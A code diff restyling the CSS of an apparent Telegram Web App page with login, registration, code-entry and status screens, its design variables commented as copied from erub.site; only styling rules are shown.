@@ -7,45 +7,239 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         /* ============================================================
-           БАЗА (дизайн как на erub.site)
+           БАЗА (скопировано с erub.site)
            ============================================================ */
+        *,
+        *:before,
+        *:after {
+            box-sizing: border-box;
+        }
         * {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+        }
+        html {
+            -webkit-text-size-adjust: 100%;
+            -webkit-tap-highlight-color: transparent;
         }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0a0e1a;
-            min-height: 100vh;
+            min-height: 100svh;
+            font-family: "Geologica", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+            font-size-adjust: .48;
+            font-size: 16px;
+            line-height: 24px;
+            color: var(--color-text-primary);
+            background: var(--color-bg-page);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizelegibility;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            background: #0b102a;
         }
+        img,
+        picture,
+        video,
+        canvas,
+        svg {
+            max-width: 100%;
+            display: block;
+        }
+        button {
+            cursor: pointer;
+            font: inherit;
+            color: inherit;
+            background: 0 0;
+            border: 0;
+            padding: 0;
+        }
+        input,
+        select,
+        textarea {
+            font: inherit;
+            color: inherit;
+        }
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
+        ul,
+        ol {
+            list-style: none;
+        }
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6 {
+            font-size: inherit;
+            font-weight: inherit;
+        }
+        p,
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6 {
+            overflow-wrap: break-word;
+        }
+
+        /* ============================================================
+           ПЕРЕМЕННЫЕ (с сайта)
+           ============================================================ */
+        :root {
+            --color-ink-1000: #001533;
+            --color-ink-900: #0b102a;
+            --color-ink-700: #001f4d;
+            --color-gray-500: #6b7280;
+            --color-gray-400: #8a9cbf;
+            --color-gray-300: #d1d5db;
+            --color-gray-200: #e7e8ea;
+            --color-gray-150: #f0f3f7;
+            --color-gray-100: #f5f5f5;
+            --color-gray-50: #f5f7fa;
+            --color-page-fade: #f4f4f4;
+            --color-section-alt: #f9fafb;
+            --color-white: #fff;
+            --color-blue-700: #0059ff;
+            --color-blue-600: #06f;
+            --color-blue-grad-from: #1e64ff;
+            --color-blue-grad-to: #00cbef;
+            --color-blue-100: #dbeafe;
+            --color-blue-050: #e6f0ff;
+            --color-success-600: #00a63e;
+            --color-success-050: #dcfce7;
+            --color-danger-050: #ffe2e2;
+            --color-border-10: #0b102a1a;
+            --color-glass-white-10: #ffffff1a;
+            --color-glass-white-20: #f6f6f633;
+            --color-glass-border-bright: #ffffffb8;
+            --color-glass-balance-border: #b9bbc247;
+            --color-glass-action-border: #dfe0e375;
+            --color-overlay-strong: #0b102a99;
+            --color-text-primary: var(--color-ink-900);
+            --color-text-secondary: var(--color-gray-500);
+            --color-text-mono: var(--color-gray-400);
+            --color-text-inverse: var(--color-white);
+            --color-text-success: var(--color-success-600);
+            --color-text-accent: var(--color-blue-600);
+            --color-bg-page: var(--color-white);
+            --color-bg-section-alt: var(--color-section-alt);
+            --color-bg-surface: var(--color-white);
+            --color-bg-surface-soft: var(--color-gray-50);
+            --color-bg-surface-muted: var(--color-gray-150);
+            --color-bg-surface-highlight: var(--color-blue-050);
+            --color-bg-glass: var(--color-glass-white-10);
+            --color-bg-glass-strong: var(--color-glass-white-20);
+            --color-bg-chip-dark: var(--color-ink-1000);
+            --color-bg-icon-success: var(--color-success-050);
+            --color-bg-icon-danger: var(--color-danger-050);
+            --color-bg-icon-info: var(--color-blue-100);
+            --color-bg-icon-neutral: var(--color-gray-100);
+            --color-bg-icon-soft: var(--color-gray-50);
+            --color-bg-icon-accent: var(--color-blue-050);
+            --color-border-default: var(--color-border-10);
+            --color-border-strong: var(--color-ink-900);
+            --color-border-accent: var(--color-blue-600);
+            --gradient-cta-primary: linear-gradient(90deg, var(--color-blue-grad-from), var(--color-blue-grad-to));
+            --gradient-cta-dark: linear-gradient(167.91deg, var(--color-ink-900) 0%, var(--color-blue-600) 100%);
+            --gradient-page-wallet: linear-gradient(170deg, #090d22 9.63%, var(--color-blue-600) 33.18%, var(--color-page-fade) 57.72%);
+            --gradient-surface-glass-blue: linear-gradient(112deg, #ffffffe0 0%, #e6f0ffc2 62%, #ffffffe6 100%);
+            --font-sans: "Geologica", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+            --font-mono: ui-monospace, "SF Mono", Consolas, "Liberation Mono", Menlo, monospace;
+            --text-display-1-size: 60px;
+            --text-display-1-lh: 75px;
+            --text-display-2-size: 48px;
+            --text-display-2-lh: 48px;
+            --text-display-3-size: 48px;
+            --text-display-3-lh: 48px;
+            --text-display-3-tracking: -1.2px;
+            --text-display-4-size: 36px;
+            --text-display-4-lh: 40px;
+            --text-display-4-tracking: -.9px;
+            --text-display-counter-size: 72px;
+            --text-display-counter-lh: 80px;
+            --text-heading-2-size: 36px;
+            --text-heading-2-lh: 40px;
+            --text-heading-3-size: 20px;
+            --text-heading-3-lh: 28px;
+            --text-heading-3-card-lh: 30px;
+            --text-heading-3-sm-size: 18px;
+            --text-heading-3-sm-lh: 28px;
+            --text-heading-4-size: 16px;
+            --text-heading-4-lh: 24px;
+            --text-body-lg-size: 20px;
+            --text-body-lg-lh: 28px;
+            --text-body-md-size: 16px;
+            --text-body-md-lh: 24px;
+            --text-body-sm-size: 14px;
+            --text-body-sm-lh: 20px;
+            --text-label-lg-size: 18px;
+            --text-label-lg-lh: 28px;
+            --text-label-md-size: 16px;
+            --text-label-md-lh: 24px;
+            --text-label-cta-size: 18px;
+            --text-label-cta-lh: 28px;
+            --text-label-xs-size: 12px;
+            --text-label-xs-lh: 16px;
+            --text-logo-size: 24px;
+            --text-logo-lh: 32px;
+            --text-mono-sm-size: 14px;
+            --text-mono-sm-lh: 20px;
+            --fw-extralight: 200;
+            --fw-light: 300;
+            --fw-regular: 400;
+            --fw-medium: 500;
+            --fw-semibold: 600;
+            --fw-bold: 700;
+            --space-1: 4px;
+            --space-2: 8px;
+            --space-3: 12px;
+            --space-4: 16px;
+            --space-6: 24px;
+            --space-8: 32px;
+            --space-12: 48px;
+            --space-16: 64px;
+            --space-20: 80px;
+            --space-32: 128px;
+            --container-narrow: 896px;
+            --container-medium: 1024px;
+            --container-wide: 1152px;
+            --bp-sm: 640px;
+            --bp-md: 1024px;
+            --bp-lg: 1280px;
+            --radius-card-sm: 14px;
+            --radius-card-md: 16px;
+            --radius-card-lg: 24px;
+            --radius-card-action: 15px;
+            --radius-pill: 9999px;
+            --border-default: 1px solid var(--color-border-default);
+            --border-strong: 2px solid var(--color-border-strong);
+            --border-accent: 2px solid var(--color-border-accent);
+            --shadow-elevation-1: 0 4px 4px 0 #00000040;
+            --shadow-elevation-blue: 0 24px 80px #0059ff1a, inset 0 1px 0 #ffffffc7;
+        }
+
+        /* ============================================================
+           КОНТЕЙНЕР
+           ============================================================ */
         .container {
-            background: linear-gradient(145deg, #12182b, #1a2340);
-            border-radius: 32px;
-            padding: 36px 28px 28px;
+            background: var(--color-white);
+            border-radius: var(--radius-card-lg);
+            padding: var(--space-6) var(--space-4);
             width: 100%;
-            max-width: 420px;
+            max-width: 440px;
             min-height: 560px;
             box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            border: 1px solid var(--color-border-default);
             display: flex;
             flex-direction: column;
             position: relative;
             overflow: hidden;
-        }
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle at 70% 30%, rgba(67, 97, 238, 0.08), transparent 60%);
-            pointer-events: none;
         }
 
         /* ============================================================
@@ -53,27 +247,25 @@
            ============================================================ */
         .logo {
             text-align: center;
-            margin-bottom: 28px;
-            position: relative;
-            z-index: 1;
+            margin-bottom: var(--space-6);
         }
         .logo h1 {
-            font-size: 34px;
-            font-weight: 800;
-            color: #fff;
+            font-size: var(--text-heading-2-size);
+            line-height: var(--text-heading-2-lh);
+            font-weight: var(--fw-semibold);
+            color: var(--color-text-primary);
             letter-spacing: -0.5px;
         }
         .logo h1 span {
-            background: linear-gradient(135deg, #4361ee, #7b61ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: var(--color-blue-600);
         }
         .logo .sub {
-            color: rgba(255, 255, 255, 0.35);
-            font-size: 11px;
-            margin-top: 4px;
-            font-weight: 400;
-            letter-spacing: 2.5px;
+            color: var(--color-text-secondary);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            margin-top: var(--space-1);
+            font-weight: var(--fw-regular);
+            letter-spacing: 1.5px;
             text-transform: uppercase;
         }
 
@@ -81,38 +273,39 @@
            БАННЕР
            ============================================================ */
         .hero-banner {
-            background: linear-gradient(135deg, rgba(67, 97, 238, 0.12), rgba(123, 97, 255, 0.08));
-            border-radius: 16px;
-            padding: 18px;
-            border: 1px solid rgba(67, 97, 238, 0.12);
-            margin: 4px 0 16px;
+            background: var(--color-bg-surface-highlight);
+            border-radius: var(--radius-card-sm);
+            padding: var(--space-4);
+            border: 1px solid var(--color-border-accent);
+            margin: var(--space-1) 0 var(--space-4);
             text-align: center;
-            position: relative;
-            z-index: 1;
         }
         .hero-banner h2 {
-            color: #fff;
-            font-size: 18px;
-            font-weight: 700;
+            color: var(--color-text-primary);
+            font-size: var(--text-body-lg-size);
+            line-height: var(--text-body-lg-lh);
+            font-weight: var(--fw-semibold);
         }
         .hero-banner .highlight {
-            color: #7b61ff;
+            color: var(--color-blue-600);
         }
         .hero-banner p {
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 13px;
-            margin-top: 2px;
+            color: var(--color-text-secondary);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            margin-top: var(--space-1);
         }
         .hero-banner .badge {
             display: inline-block;
-            background: rgba(40, 167, 69, 0.15);
-            color: #4ade80;
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-top: 6px;
-            border: 1px solid rgba(40, 167, 69, 0.1);
+            background: var(--color-bg-icon-success);
+            color: var(--color-text-success);
+            padding: var(--space-1) var(--space-3);
+            border-radius: var(--radius-pill);
+            font-size: var(--text-label-xs-size);
+            line-height: var(--text-label-xs-lh);
+            font-weight: var(--fw-medium);
+            margin-top: var(--space-2);
+            border: 1px solid rgba(0, 166, 62, 0.15);
         }
 
         /* ============================================================
@@ -121,29 +314,28 @@
         .menu-grid {
             display: flex;
             flex-direction: column;
-            gap: 6px;
-            margin: 8px 0 16px;
-            position: relative;
-            z-index: 1;
+            gap: var(--space-1);
+            margin: var(--space-2) 0 var(--space-4);
         }
         .menu-item {
-            padding: 14px 18px;
-            background: rgba(255, 255, 255, 0.04);
-            border-radius: 14px;
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 14px;
-            font-weight: 500;
+            padding: var(--space-3) var(--space-4);
+            background: var(--color-bg-surface-soft);
+            border-radius: var(--radius-card-sm);
+            color: var(--color-text-primary);
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            font-weight: var(--fw-medium);
             cursor: pointer;
-            transition: 0.2s;
-            border: 1px solid rgba(255, 255, 255, 0.04);
+            transition: background .15s, color .15s;
+            border: 1px solid transparent;
             text-align: left;
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: var(--space-3);
         }
         .menu-item:hover {
-            background: rgba(255, 255, 255, 0.08);
-            color: #fff;
+            background: var(--color-bg-surface-muted);
+            border-color: var(--color-border-default);
         }
         .menu-item .icon {
             font-size: 18px;
@@ -153,8 +345,207 @@
         }
         .menu-item .arrow {
             margin-left: auto;
-            color: rgba(255, 255, 255, 0.2);
+            color: var(--color-text-mono);
             font-size: 18px;
+        }
+
+        /* ============================================================
+           КНОПКИ
+           ============================================================ */
+        .btn-primary {
+            width: 100%;
+            padding: var(--space-4);
+            background: var(--gradient-cta-primary);
+            color: var(--color-text-inverse);
+            border: none;
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-label-md-size);
+            line-height: var(--text-label-md-lh);
+            font-weight: var(--fw-semibold);
+            cursor: pointer;
+            transition: filter .15s, transform .1s;
+            margin-top: var(--space-2);
+            box-shadow: 0 8px 30px rgba(0, 102, 255, 0.25);
+        }
+        .btn-primary:hover {
+            filter: brightness(1.06);
+            transform: translateY(-1px);
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+            filter: none !important;
+        }
+
+        .btn-eid {
+            width: 100%;
+            padding: var(--space-4);
+            background: var(--color-danger-050);
+            color: #b91c1c;
+            border: 1px solid #f5c6c6;
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-label-md-size);
+            line-height: var(--text-label-md-lh);
+            font-weight: var(--fw-semibold);
+            cursor: pointer;
+            transition: background .15s, transform .1s;
+            margin-top: var(--space-2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn-eid:hover {
+            background: #f8d7da;
+        }
+        .btn-eid:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: var(--space-3);
+            background: var(--color-bg-surface-soft);
+            color: var(--color-text-primary);
+            border: 1px solid var(--color-border-default);
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            font-weight: var(--fw-medium);
+            cursor: pointer;
+            transition: background .15s;
+            margin-top: var(--space-3);
+        }
+        .btn-secondary:hover {
+            background: var(--color-bg-surface-muted);
+        }
+
+        .btn-back {
+            width: 100%;
+            padding: var(--space-3);
+            background: transparent;
+            color: var(--color-text-secondary);
+            border: 1px solid var(--color-border-default);
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            font-weight: var(--fw-medium);
+            cursor: pointer;
+            transition: background .15s;
+            margin-top: var(--space-3);
+        }
+        .btn-back:hover {
+            background: var(--color-bg-surface-soft);
+        }
+
+        .support-btn {
+            width: 100%;
+            padding: var(--space-3);
+            background: transparent;
+            color: var(--color-text-secondary);
+            border: 1px solid var(--color-border-default);
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            font-weight: var(--fw-medium);
+            cursor: pointer;
+            transition: background .15s;
+            margin-top: var(--space-3);
+        }
+        .support-btn:hover {
+            background: var(--color-bg-surface-soft);
+        }
+
+        /* ============================================================
+           ФОРМА
+           ============================================================ */
+        .form-group {
+            margin-bottom: var(--space-4);
+        }
+        .form-group label {
+            display: block;
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            font-weight: var(--fw-medium);
+            color: var(--color-text-secondary);
+            margin-bottom: var(--space-1);
+        }
+        .form-group input {
+            width: 100%;
+            padding: var(--space-3) var(--space-4);
+            border: 1px solid var(--color-border-default);
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            transition: border-color .15s, box-shadow .15s;
+            background: var(--color-bg-surface-soft);
+            color: var(--color-text-primary);
+        }
+        .form-group input::placeholder {
+            color: var(--color-text-mono);
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--color-blue-600);
+            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15);
+        }
+        .form-group input:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .forgot-link {
+            text-align: right;
+            margin-top: -6px;
+            margin-bottom: var(--space-3);
+        }
+        .forgot-link a {
+            color: var(--color-text-secondary);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            transition: color .15s;
+        }
+        .forgot-link a:hover {
+            color: var(--color-text-accent);
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: var(--space-3);
+            margin: var(--space-4) 0 var(--space-3);
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--color-border-default);
+        }
+        .divider span {
+            color: var(--color-text-mono);
+            font-size: var(--text-label-xs-size);
+            line-height: var(--text-label-xs-lh);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .register-link {
+            text-align: center;
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            color: var(--color-text-secondary);
+            margin-top: var(--space-3);
+        }
+        .register-link a {
+            color: var(--color-text-accent);
+            font-weight: var(--fw-medium);
+        }
+        .register-link a:hover {
+            text-decoration: underline;
         }
 
         /* ============================================================
@@ -163,9 +554,7 @@
         .page {
             display: none;
             flex-direction: column;
-            animation: fadeIn 0.35s ease;
-            position: relative;
-            z-index: 1;
+            animation: fadeIn 0.3s ease;
             flex: 1;
         }
         .page.active {
@@ -174,7 +563,7 @@
         @keyframes fadeIn {
             from {
                 opacity: 0;
-                transform: translateY(12px);
+                transform: translateY(8px);
             }
             to {
                 opacity: 1;
@@ -183,339 +572,129 @@
         }
 
         .page-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #fff;
+            font-size: var(--text-heading-2-size);
+            line-height: var(--text-heading-2-lh);
+            font-weight: var(--fw-semibold);
+            color: var(--color-text-primary);
             text-align: center;
-            margin-bottom: 4px;
+            margin-bottom: var(--space-1);
         }
         .page-sub {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.4);
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            color: var(--color-text-secondary);
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: var(--space-4);
         }
         .page-icon {
             text-align: center;
             font-size: 40px;
-            margin-bottom: 6px;
+            margin-bottom: var(--space-2);
         }
 
         /* ============================================================
-           ФОРМА
-           ============================================================ */
-        .form-group {
-            margin-bottom: 18px;
-        }
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: rgba(255, 255, 255, 0.6);
-            margin-bottom: 6px;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 2px solid rgba(255, 255, 255, 0.08);
-            border-radius: 14px;
-            font-size: 15px;
-            transition: 0.25s;
-            background: rgba(255, 255, 255, 0.05);
-            color: #fff;
-        }
-        .form-group input::placeholder {
-            color: rgba(255, 255, 255, 0.25);
-        }
-        .form-group input:focus {
-            outline: none;
-            border-color: #4361ee;
-            background: rgba(255, 255, 255, 0.08);
-            box-shadow: 0 0 0 4px rgba(67, 97, 238, 0.08);
-        }
-        .form-group input:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-        }
-
-        /* ============================================================
-           КНОПКИ
-           ============================================================ */
-        .btn-primary {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #4361ee, #7b61ff);
-            color: #fff;
-            border: none;
-            border-radius: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 6px;
-            box-shadow: 0 8px 30px rgba(67, 97, 238, 0.25);
-            position: relative;
-            z-index: 1;
-        }
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 40px rgba(67, 97, 238, 0.35);
-        }
-        .btn-primary:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none !important;
-            box-shadow: none !important;
-        }
-
-        .btn-eid {
-            width: 100%;
-            padding: 16px;
-            background: #dc3545;
-            color: #fff;
-            border: none;
-            border-radius: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            box-shadow: 0 8px 30px rgba(220, 53, 69, 0.25);
-            position: relative;
-            z-index: 1;
-        }
-        .btn-eid:hover {
-            background: #c82333;
-            transform: translateY(-2px);
-            box-shadow: 0 12px 40px rgba(220, 53, 69, 0.35);
-        }
-        .btn-eid:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none !important;
-            box-shadow: none !important;
-        }
-
-        .btn-secondary {
-            width: 100%;
-            padding: 14px;
-            background: rgba(255, 255, 255, 0.05);
-            color: rgba(255, 255, 255, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 14px;
-            font-size: 15px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 10px;
-            position: relative;
-            z-index: 1;
-        }
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.1);
-            color: #fff;
-        }
-
-        .btn-back {
-            width: 100%;
-            padding: 14px;
-            background: transparent;
-            color: rgba(255, 255, 255, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 14px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 10px;
-            position: relative;
-            z-index: 1;
-        }
-        .btn-back:hover {
-            background: rgba(255, 255, 255, 0.04);
-            color: rgba(255, 255, 255, 0.6);
-        }
-
-        .support-btn {
-            width: 100%;
-            padding: 14px;
-            background: rgba(255, 255, 255, 0.03);
-            color: rgba(255, 255, 255, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            border-radius: 14px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 14px;
-            position: relative;
-            z-index: 1;
-        }
-        .support-btn:hover {
-            background: rgba(255, 255, 255, 0.06);
-            color: rgba(255, 255, 255, 0.5);
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 18px 0 14px;
-            position: relative;
-            z-index: 1;
-        }
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: rgba(255, 255, 255, 0.06);
-        }
-        .divider span {
-            color: rgba(255, 255, 255, 0.2);
-            font-size: 12px;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .forgot-link {
-            text-align: right;
-            margin-top: -6px;
-            margin-bottom: 14px;
-            position: relative;
-            z-index: 1;
-        }
-        .forgot-link a {
-            color: rgba(255, 255, 255, 0.3);
-            font-size: 13px;
-            text-decoration: none;
-            transition: 0.2s;
-        }
-        .forgot-link a:hover {
-            color: #4361ee;
-        }
-
-        .register-link {
-            text-align: center;
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.3);
-            margin-top: 12px;
-            position: relative;
-            z-index: 1;
-        }
-        .register-link a {
-            color: #4361ee;
-            font-weight: 600;
-            text-decoration: none;
-        }
-        .register-link a:hover {
-            text-decoration: underline;
-        }
-
-        /* ============================================================
-           КОНТЕНТ СТРАНИЦ
+           КОНТЕНТ БЛОКИ
            ============================================================ */
         .content-block {
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 16px;
-            padding: 18px 16px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            margin-bottom: 10px;
+            background: var(--color-bg-surface-soft);
+            border-radius: var(--radius-card-sm);
+            padding: var(--space-4) var(--space-4);
+            border: 1px solid var(--color-border-default);
+            margin-bottom: var(--space-3);
         }
         .content-block h3 {
-            font-size: 17px;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 6px;
+            font-size: var(--text-body-lg-size);
+            line-height: var(--text-body-lg-lh);
+            font-weight: var(--fw-semibold);
+            color: var(--color-text-primary);
+            margin-bottom: var(--space-1);
         }
         .content-block p {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.6);
-            line-height: 1.6;
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            color: var(--color-text-secondary);
         }
         .content-block .num {
-            font-size: 12px;
-            font-weight: 700;
-            color: #4361ee;
+            font-size: var(--text-label-xs-size);
+            line-height: var(--text-label-xs-lh);
+            font-weight: var(--fw-semibold);
+            color: var(--color-text-accent);
             text-transform: uppercase;
             letter-spacing: 1px;
-            margin-bottom: 2px;
+            margin-bottom: var(--space-1);
         }
         .content-block .highlight-text {
-            color: #7b61ff;
-            font-weight: 500;
+            color: var(--color-text-accent);
+            font-weight: var(--fw-medium);
         }
         .content-block .green-text {
-            color: #4ade80;
-            font-weight: 500;
+            color: var(--color-text-success);
+            font-weight: var(--fw-medium);
         }
 
         /* ============================================================
            FAQ
            ============================================================ */
         .faq-item {
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 14px;
-            padding: 14px 16px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            margin-bottom: 8px;
+            background: var(--color-bg-surface-soft);
+            border-radius: var(--radius-card-sm);
+            padding: var(--space-3) var(--space-4);
+            border: 1px solid var(--color-border-default);
+            margin-bottom: var(--space-2);
         }
         .faq-item .q {
-            font-weight: 600;
-            color: #fff;
-            font-size: 14px;
-            margin-bottom: 4px;
+            font-weight: var(--fw-semibold);
+            color: var(--color-text-primary);
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            margin-bottom: var(--space-1);
         }
         .faq-item .a {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.5);
-            line-height: 1.5;
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            color: var(--color-text-secondary);
         }
 
         /* ============================================================
            КОД / ССЫЛКА
            ============================================================ */
         .code-section {
-            margin-top: 4px;
-            padding: 20px 16px 16px;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
+            margin-top: var(--space-1);
+            padding: var(--space-4) var(--space-4);
+            background: var(--color-bg-surface-soft);
+            border-radius: var(--radius-card-sm);
+            border: 1px solid var(--color-border-default);
         }
         .code-section label {
             display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: rgba(255, 255, 255, 0.5);
-            margin-bottom: 8px;
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            font-weight: var(--fw-medium);
+            color: var(--color-text-secondary);
+            margin-bottom: var(--space-2);
         }
         .code-section input {
             width: 100%;
-            padding: 14px 16px;
-            border: 2px solid rgba(255, 255, 255, 0.08);
-            border-radius: 12px;
-            font-size: 15px;
-            background: rgba(255, 255, 255, 0.04);
-            color: #fff;
-            transition: 0.25s;
-            margin-bottom: 12px;
+            padding: var(--space-3) var(--space-4);
+            border: 1px solid var(--color-border-default);
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            background: var(--color-white);
+            color: var(--color-text-primary);
+            transition: border-color .15s, box-shadow .15s;
+            margin-bottom: var(--space-3);
         }
         .code-section input:focus {
             outline: none;
-            border-color: #4361ee;
-            background: rgba(255, 255, 255, 0.08);
-            box-shadow: 0 0 0 4px rgba(67, 97, 238, 0.08);
+            border-color: var(--color-blue-600);
+            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15);
         }
         .code-section input::placeholder {
-            color: rgba(255, 255, 255, 0.2);
+            color: var(--color-text-mono);
         }
         .code-section input:disabled {
-            opacity: 0.4;
+            opacity: 0.5;
             cursor: not-allowed;
         }
 
@@ -523,124 +702,113 @@
            СООБЩЕНИЯ
            ============================================================ */
         .message {
-            margin-top: 16px;
-            padding: 12px 16px;
-            border-radius: 12px;
+            margin-top: var(--space-4);
+            padding: var(--space-3) var(--space-4);
+            border-radius: var(--radius-card-sm);
             display: none;
             text-align: center;
-            font-size: 14px;
-            font-weight: 500;
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            font-weight: var(--fw-medium);
             animation: fadeIn 0.3s ease;
-            position: relative;
-            z-index: 1;
         }
         .message.success {
             display: block;
-            background: rgba(40, 167, 69, 0.12);
-            color: #4ade80;
-            border: 1px solid rgba(40, 167, 69, 0.15);
+            background: var(--color-success-050);
+            color: var(--color-text-success);
+            border: 1px solid rgba(0, 166, 62, 0.15);
         }
         .message.error {
             display: block;
-            background: rgba(220, 53, 69, 0.12);
-            color: #f87171;
-            border: 1px solid rgba(220, 53, 69, 0.15);
+            background: var(--color-danger-050);
+            color: #b91c1c;
+            border: 1px solid #f5c6c6;
         }
         .message.info {
             display: block;
-            background: rgba(67, 97, 238, 0.1);
-            color: #818cf8;
-            border: 1px solid rgba(67, 97, 238, 0.15);
+            background: var(--color-blue-050);
+            color: var(--color-text-accent);
+            border: 1px solid rgba(0, 102, 255, 0.15);
         }
 
         /* ============================================================
-           ОШИБКА (3 попытки) — строгая, без бомжатины
+           СТАТУС ОЖИДАНИЯ
            ============================================================ */
-        .error-block {
-            text-align: center;
-            padding: 20px 0;
-        }
-        .error-block .icon {
-            font-size: 56px;
-            margin-bottom: 12px;
-            color: #f87171;
-        }
-        .error-block h2 {
-            font-size: 20px;
-            color: #f87171;
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-        .error-block p {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.5);
-            line-height: 1.6;
-            margin-bottom: 16px;
-        }
-
-        /* ============================================================
-           СТРАНИЦА ОШИБКИ (после попыток)
-           ============================================================ */
-        .error-page .error-icon {
-            font-size: 48px;
-            color: #f87171;
-            text-align: center;
-            margin-bottom: 12px;
-        }
-        .error-page h2 {
-            text-align: center;
-            color: #f87171;
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-        .error-page p {
-            text-align: center;
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 16px;
-        }
-
         .status-waiting {
-            margin-top: 12px;
-            padding: 12px;
-            background: rgba(67, 97, 238, 0.08);
-            border-radius: 12px;
